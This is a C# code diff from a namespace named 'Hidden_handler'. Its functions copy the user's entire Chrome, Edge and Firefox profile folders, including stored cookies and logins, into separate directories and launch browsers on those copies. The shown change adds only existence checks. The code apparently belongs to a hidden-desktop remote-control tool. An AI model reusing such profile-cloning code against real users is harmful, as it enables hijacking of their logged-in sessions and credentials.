@@ -186,17 +186,24 @@ namespace Hidden_handler
             return CreateProc("\"" + path + "\"" + " -no-remote -profile " + dataDir);
         }
 
-        public async Task<bool> CloneChrome() 
+        public async Task<bool> CloneChrome()
         {
             try
             {
                 string dataDir = @"C:\ChromeAutomationData";
                 string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Google\Chrome\User Data";
-                await Task.Run(() => Directory.Delete(dataDir, true));
-                Directory.CreateDirectory(dataDir);
+                if (Directory.Exists(dataDir))
+                {
+                    await Task.Run(() => Directory.Delete(dataDir, true));
+                    Directory.CreateDirectory(dataDir);
+                }
+                else
+                {
+                    Directory.CreateDirectory(dataDir);
+                }
                 await CopyDirAsync(source, dataDir);
                 return true;
-                
+
             }
             catch { }
             return false;
@@ -208,14 +215,21 @@ namespace Hidden_handler
             {
                 string profilesPath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Mozilla\Firefox\Profiles";
                 string fileInDirectory = "addons.json";
-                string source=RecursiveFileSearch(profilesPath, fileInDirectory);
-                if (source == null) 
+                string source = RecursiveFileSearch(profilesPath, fileInDirectory);
+                if (source == null)
                 {
                     return false;
                 }
                 string dataDir = @"C:\FirefoxAutomationData";
-                await Task.Run(() => Directory.Delete(dataDir, true));
-                Directory.CreateDirectory(dataDir);
+                if (Directory.Exists(dataDir))
+                {
+                    await Task.Run(() => Directory.Delete(dataDir, true));
+                    Directory.CreateDirectory(dataDir);
+                }
+                else
+                {
+                    Directory.CreateDirectory(dataDir);
+                }
                 await CopyDirAsync(source, dataDir);
                 return true;
 
@@ -230,8 +244,15 @@ namespace Hidden_handler
             {
                 string dataDir = @"C:\EdgeAutomationData";
                 string source = $@"C:\Users\{Environment.UserName}\AppData\Local\Microsoft\Edge\User Data";
-                await Task.Run(()=>Directory.Delete(dataDir, true));
-                Directory.CreateDirectory(dataDir);
+                if (Directory.Exists(dataDir))
+                {
+                    await Task.Run(() => Directory.Delete(dataDir, true));
+                    Directory.CreateDirectory(dataDir);
+                }
+                else
+                {
+                    Directory.CreateDirectory(dataDir);
+                }
                 await CopyDirAsync(source, dataDir);
                 return true;
 
@@ -239,6 +260,7 @@ namespace Hidden_handler
             catch { }
             return false;
         }
+
         static string RecursiveFileSearch(string currentDirectory, string targetFileName)
         {
             string targetFilePath = Path.Combine(currentDirectory, targetFileName);
@@ -256,7 +278,6 @@ namespace Hidden_handler
             }
             return null;
         }
-
         public async Task CopyDirAsync(string sourceDir, string destinationDir)
         {
             await CopyDirectoriesAsync(sourceDir, destinationDir);
